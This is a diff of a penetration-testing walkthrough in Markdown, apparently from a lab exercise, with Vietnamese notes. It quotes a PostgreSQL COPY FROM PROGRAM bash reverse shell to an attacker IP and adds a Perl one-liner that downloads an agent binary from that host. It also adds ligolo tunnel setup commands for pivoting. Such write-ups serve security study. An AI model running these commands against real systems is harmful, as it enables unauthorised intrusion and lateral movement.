@@ -113,10 +113,20 @@ COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.17.152/4445 0>&1"';
 ![alt text](image-21.png)
 ![alt text](image-22.png)
 ```code
+python3 -m http.server 8000
+
 perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.17.152:8000");print $s "GET /agent HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">agent";binmode F;print F while<$s>;close F'
+```
+- Tạo TUN interface trên Kali
+```code
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+ip addr show ligolo -> kiểm tra
 ```
 - Sau đó thực thi agent để kết nối lại máy chủ atk 
 ![alt text](image-23.png)
+
 ```code
 ./proxy -selfcert -laddr 0.0.0.0:11601
 
